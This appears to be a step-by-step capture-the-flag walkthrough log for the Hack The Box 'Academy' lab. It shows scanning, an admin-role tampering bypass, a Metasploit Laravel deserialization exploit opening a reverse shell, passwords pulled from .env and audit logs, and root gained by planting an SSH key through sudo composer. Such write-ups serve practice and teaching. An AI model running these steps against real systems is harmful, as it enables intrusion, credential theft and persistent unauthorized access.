@@ -1,0 +1,378 @@
+Machine-Name : Academy
+IP-Address   : 10.129.42.220
+
+Command-Line: sudo nmap -A 10.129.42.220
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 14:52 EST
+    Nmap scan report for academy.htb (10.129.42.220)
+    Host is up (0.062s latency).
+    Not shown: 998 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
+    |   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
+    |_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+    |_http-server-header: Apache/2.4.41 (Ubuntu)
+    |_http-title: Hack The Box Academy
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+OS: Ubuntu focal (20.04LTS)
+
+Command-Line: cd ~/HackingTools/dirsearch
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e php -f -t 20 -u http://academy.htb
+Result:
+    [13:55:50] Starting:
+    [13:55:51] 403 -  276B  - /.hta.php
+    [13:55:51] 403 -  276B  - /.htaccess.php
+    [13:55:51] 403 -  276B  - /.hta/
+    [13:55:51] 403 -  276B  - /.htpasswd.php
+    [13:55:58] 200 -    3KB - /admin.php
+    [13:55:58] 200 -    3KB - /admin.php/
+    [13:56:06] 200 -    0B  - /config.php
+    [13:56:15] 302 -   54KB - /home.php  ->  login.php
+    [13:56:16] 403 -  276B  - /icons/
+    [13:56:16] 403 -  276B  - /images/
+    [13:56:16] 301 -  311B  - /images  ->  http://academy.htb/images/
+    [13:56:16] 200 -    2KB - /index.php
+    [13:56:16] 200 -    2KB - /index.php/
+    [13:56:20] 200 -    3KB - /login.php
+    [13:56:31] 200 -    3KB - /register.php
+    [13:56:33] 403 -  276B  - /server-status/
+    [13:56:33] 403 -  276B  - /server-status
+
+    Task Completed
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -t 20 -u http://academy.htb
+Result:
+    [14:40:24] Starting:
+    [14:40:24] 200 -    2KB - /index.php
+    [14:40:24] 403 -  276B  - /images/
+    [14:40:24] 301 -  311B  - /images  ->  http://academy.htb/images/
+    [14:40:25] 302 -   54KB - /home.php  ->  login.php
+    [14:40:25] 200 -    3KB - /login.php
+    [14:40:25] 200 -    3KB - /register.php
+    [14:40:26] 403 -  276B  - /icons/
+    [14:40:28] 200 -    3KB - /admin.php
+    [14:40:42] 200 -    0B  - /config.php
+    [14:57:41] 403 -  276B  - /server-status
+    [14:57:41] 403 -  276B  - /server-status/
+
+    Task Completed
+
+
+Command-Line: sudo dirb http://academy.htb
+Result:
+    -----------------
+    DIRB v2.22
+    By The Dark Raver
+    -----------------
+
+    START_TIME: Mon Nov 16 14:00:17 2020
+    URL_BASE: http://academy.htb/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+    -----------------
+
+    GENERATED WORDS: 4613
+
+    ---- Scanning URL: http://academy.htb/ ----
+    + http://academy.htb/admin.php (CODE:200|SIZE:2633)
+    ==> DIRECTORY: http://academy.htb/images/
+    + http://academy.htb/index.php (CODE:200|SIZE:2117)
+    + http://academy.htb/server-status (CODE:403|SIZE:276)
+
+    ---- Entering directory: http://academy.htb/images/ ----
+
+    -----------------
+    END_TIME: Mon Nov 16 14:10:33 2020
+    DOWNLOADED: 9226 - FOUND: 3
+
+
+Command-Line: sudo dirb http://acedemy.htb -X .txt
+Result:
+    -----------------
+    DIRB v2.22
+    By The Dark Raver
+    -----------------
+
+    START_TIME: Mon Nov 16 14:14:53 2020
+    URL_BASE: http://academy.htb/
+    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+    EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]
+
+    -----------------
+
+    GENERATED WORDS: 4613
+
+    ---- Scanning URL: http://academy.htb/ ----
+
+    -----------------
+    END_TIME: Mon Nov 16 14:20:21 2020
+    DOWNLOADED: 4613 - FOUND: 0
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -f -t 20 -u http://academy.htb
+Result:
+
+Notes: Turn ON Burp. Intercept OFF.
+
+Notes: "Register and Login found on landing page (http://academy.htb)"
+
+Registered:
+    username: agentsmith
+    password: password
+
+Browser: http://academy.htb/admin.php
+
+Notes: Opened "Target" in Burp. Selected academy.htb/register/username=agaentsmith&password=password and sent to "Repeater"
+Notes: In "Repeater" I changed the username to agentsmith1 and the password to password1. I also changed the roleid to 1 (previously was 0).
+Burp: Clicked "Send" in Repeater until 200-OK.
+Logging into Admin with:
+    username: agentsmith1
+    password: password1
+Result: ** SUCCESSFUL **. Logged in as admin user.
+
+HTTP results from login:
+    Academy Launch Planner
+    Item 	Status
+    Complete initial set of modules (cry0l1t3 / mrb3n) 	done
+    Finalize website design 	done
+    Test all modules 	done
+    Prepare launch campaign 	done
+    Separate student and admin roles 	done
+    Fix issue with dev-staging-01.academy.htb 	pending
+
+Notes: Attempting to access "dev-staging-01.academy.htb".
+Result: Not Connecting.
+
+Command-line: sudo nano /etc/hosts
+Input: 10.129.42.220   dev-staging-01.academy.htb
+
+
+Command-Line: sudo msfconsole
+MSF: search Laravel
+Result:
+#  Name                                              Disclosure Date  Rank       Check  Description
+-  ----                                              ---------------  ----       -----  -----------
+0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution
+
+MSF: use 0
+Result:
+    [*] Using configured payload cmd/unix/reverse_perl
+    msf6 exploit(unix/http/laravel_token_unserialize_exec) >
+
+
+
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > show options:
+Result:
+    Module options (exploit/unix/http/laravel_token_unserialize_exec):
+
+       Name       Current Setting  Required  Description
+       ----       ---------------  --------  -----------
+       APP_KEY                     no        The base64 encoded APP_KEY string from the .env file
+       Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+       RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+       RPORT      80               yes       The target port (TCP)
+       SSL        false            no        Negotiate SSL/TLS for outgoing connections
+       TARGETURI  /                yes       Path to target webapp
+       VHOST                       no        HTTP server virtual host
+
+
+    Payload options (cmd/unix/reverse_perl):
+
+       Name   Current Setting  Required  Description
+       ----   ---------------  --------  -----------
+       LHOST                   yes       The listen address (an interface may be specified)
+       LPORT  4444             yes       The listen port
+
+
+    Exploit target:
+
+       Id  Name
+       --  ----
+       0   Automatic
+
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set rhosts 10.129.42.220
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set lhost 10.10.14.89
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set lport 80
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set vhost dev-staging-01.academy.htb
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > run
+Result:
+    [*] Started reverse TCP handler on 10.10.14.89:80
+    [*] Command shell session 1 opened (10.10.14.89:80 -> 10.129.42.220:51414) at 2020-11-17 14:39:07 -0500
+    [*] Command shell session 2 opened (10.10.14.89:80 -> 10.129.42.220:51418) at 2020-11-17 14:39:07 -0500
+
+    whoami
+    www-data
+*** REVERSE SHELL ***
+
+Reverse-Shell: which python
+Result: /usr/bin/python3
+Reverse-Shell: python3 -c 'import pty;pty.spawn("/bin/bash")'
+Result: www-data@academy:/var/www/html/htb-academy-dev-01/public$
+Reverse-Shell: stty raw -echo
+Reverse-Shell: cd /home
+Reverse-Shell: ls
+Result:
+    21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
+Found User: cry0l1t3
+Reverse-Shell: cat user.txt
+Result: Permission Denied
+
+
+Reverse-Shell: cd /var/www/html/academy
+Reverse-Shell: ls -la
+Result:
+total 280
+drwxr-xr-x 12 www-data www-data   4096 Aug 13 12:42 .
+drwxr-xr-x  4 root     root       4096 Aug 13 12:36 ..
+-rw-r--r--  1 www-data www-data    706 Aug 13 12:42 .env
+-rw-r--r--  1 www-data www-data    651 Feb  7  2018 .env.example
+-rw-r--r--  1 www-data www-data    111 Feb  7  2018 .gitattributes
+-rw-r--r--  1 www-data www-data    155 Feb  7  2018 .gitignore
+drwxr-xr-x  6 www-data www-data   4096 Feb  7  2018 app
+-rwxr-xr-x  1 www-data www-data   1686 Feb  7  2018 artisan
+drwxr-xr-x  3 www-data www-data   4096 Feb  7  2018 bootstrap
+-rw-r--r--  1 www-data www-data   1512 Feb  7  2018 composer.json
+-rw-r--r--  1 www-data www-data 191621 Aug  9 11:57 composer.lock
+drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 config
+drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 database
+-rw-r--r--  1 www-data www-data   1150 Feb  7  2018 package.json
+-rw-r--r--  1 www-data www-data   1040 Feb  7  2018 phpunit.xml
+drwxr-xr-x  4 www-data www-data   4096 Nov  9 10:23 public
+-rw-r--r--  1 www-data www-data   3622 Feb  7  2018 readme.md
+drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 resources
+drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 routes
+-rw-r--r--  1 www-data www-data    563 Feb  7  2018 server.php
+drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 storage
+drwxr-xr-x  4 www-data www-data   4096 Feb  7  2018 tests
+drwxr-xr-x 38 www-data www-data   4096 Aug  9 11:57 vendor
+-rw-r--r--  1 www-data www-data    549 Feb  7  2018 webpack.mix.js
+
+Reverse-Shell: cat .env
+Result:
+    APP_NAME=Laravel
+    APP_ENV=local
+    APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+    APP_DEBUG=false
+    APP_URL=http://localhost
+
+    LOG_CHANNEL=stack
+
+    DB_CONNECTION=mysql
+    DB_HOST=127.0.0.1
+    DB_PORT=3306
+    DB_DATABASE=academy
+    DB_USERNAME=dev
+    DB_PASSWORD=mySup3rP4s5w0rd!!
+
+    BROADCAST_DRIVER=log
+    CACHE_DRIVER=file
+    SESSION_DRIVER=file
+    SESSION_LIFETIME=120
+    QUEUE_DRIVER=sync
+
+    REDIS_HOST=127.0.0.1
+    REDIS_PASSWORD=null
+    REDIS_PORT=6379
+
+    MAIL_DRIVER=smtp
+    MAIL_HOST=smtp.mailtrap.io
+    MAIL_PORT=2525
+    MAIL_USERNAME=null
+    MAIL_PASSWORD=null
+    MAIL_ENCRYPTION=null
+
+    PUSHER_APP_ID=
+    PUSHER_APP_KEY=
+    PUSHER_APP_SECRET=
+    PUSHER_APP_CLUSTER=mt1
+
+    MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
+    MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
+
+Reverse-Shell: su cry0l1t3
+Password: mySup3rP4s5w0rd!!
+Result:
+    *** ACCESS GRANTED ***
+
+Rever-Shell: cat /home/cry0l1t3/user.txt
+Result: 2597e68eb177e7cd6e9e43e6c181b6c3
+
+*** USER OWNED ***
+
+Attempting root access...
+
+Reverse-Shell: sudo -l
+Result: Sorry, user cry0l1t3 may not run sudo on academy.
+
+Reverse-Shell: cd /var/log/
+Reverse-Shell: ls
+Result:
+    alternatives.log       dist-upgrade   kern.log.3.gz         vmware-network.2.log
+    alternatives.log.1     dmesg          kern.log.4.gz         vmware-network.3.log
+    alternatives.log.2.gz  dmesg.0        landscape             vmware-network.4.log
+    alternatives.log.3.gz  dmesg.1.gz     lastlog               vmware-network.5.log
+    apache2                dmesg.2.gz     mysql                 vmware-network.6.log
+    apt                    dmesg.3.gz     private               vmware-network.7.log
+    audit                  dmesg.4.gz     syslog                vmware-network.8.log
+    auth.log               dpkg.log       syslog.1              vmware-network.9.log
+    auth.log.1             dpkg.log.1     syslog.2.gz           vmware-network.log
+    auth.log.2.gz          dpkg.log.2.gz  syslog.3.gz           vmware-vmsvc-root.1.log
+    auth.log.3.gz          dpkg.log.3.gz  syslog.4.gz           vmware-vmsvc-root.2.log
+    auth.log.4.gz          faillog        syslog.5.gz           vmware-vmsvc-root.3.log
+    bootstrap.log          installer      syslog.6.gz           vmware-vmsvc-root.log
+    btmp                   journal        syslog.7.gz           vmware-vmtoolsd-root.log
+    btmp.1                 kern.log       ubuntu-advantage.log  wtmp
+    cloud-init.log         kern.log.1     unattended-upgrades
+    cloud-init-output.log  kern.log.2.gz  vmware-network.1.log
+
+Reverse-Shell: cd audit
+Reverse-Shell: cat * | grep 'comm="su"'
+Result: type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
+6D7262336E5F41634064336D79210A: HEX, Translation: mrb3n_Ac@d3my!
+
+Reverse-Shell: su mrb3n
+Password: mrb3n_Ac@d3my!
+Reverse-Shell: whoami
+Result: mrb3n
+Reverse-Shell: sudo -l
+Result:
+    User mrb3n may run the following commands on academy:
+        (ALL) /usr/bin/composer
+
+Notes: Searched GTFOBins for "composer".
+Results:
+    Shell
+
+    It can be used to break out from restricted environments by spawning an interactive system shell.
+
+        TF=$(mktemp -d)
+        echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
+        composer --working-dir=$TF run-script x
+
+Command-Line: ssh-keygen
+Result: Files saved to ~/.ssh/
+Reverse-Shell: TF=$(mktemp -d)
+Reverse-Shell: nano $TF/composer.json
+
+File-Contents:
+{"scripts":{"SSH":"echo 'my_id_rsa.pub' >> /root/.ssh/authorized_keys"}}
+Notes: Saved-File and Exited.
+Reverse-Shell: sudo composer --working-dir=$TF run-script SSH
+Result:
+    [sudo] password for mrb3n:
+    PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+    PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+    Do not run Composer as root/super user! See https://getcomposer.org/root for details
+    > echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCerEpuzruMnHwUH1Y5h2TkHWGBuVIGR1iG/aWGlawmFuN0kRZbPlziHjxx1TInScg+eda5vARXqhrUyhq1dMyGgh3IBdfoc3mak9qxXe5QDHqaeyMHnRATbmOLboLUuDzu0HhyJoRi0rqR8xqFlCgsn2ycRhgSE1i1gcx+M76kc6nVE0FuvFm8mvFKvHK2s9mXVzvc5AbvATM3+HGLC2L0IYCjrnKFWM0xHzxq1kZG5429YhveuPuJOOqnk48MdmtJenryTECZoOHPxUS+Rm9T19vxtS9Zpeg3J8/Jcg7kDsLD3iTdA/4qAZCyHvhr5LNMeCulSqz2LgYDzUFEEIyJrNjJOxG2jWuG3J9Ej3aREAYFCjoiey47rUAozcctY0ZTVTds5SCg1WbQW8ulD0DON/YwiUAttSTPS13E3+hYQ2GwfzPkYNLM1Tdu4ymsp07D/P6Gm+auKKkdgXt8mKYq4LwlvFZagjlIemRymtgvW4QEWMFzpQv1AtowlxTvGOs= kali@kali' >> /root/.ssh/authorized_keys
+
+Command-Line: ssh -i id_rsa root@academy.htb
+Result: ** ROOT ACCESS **
+Reverse-Shell: cat /root/root.txt
+Result: 15052ea1ee3e5bacc3d90eaa7be82724
+    *** ROOT OWNED ***
+
+
+*** FINISHED ***
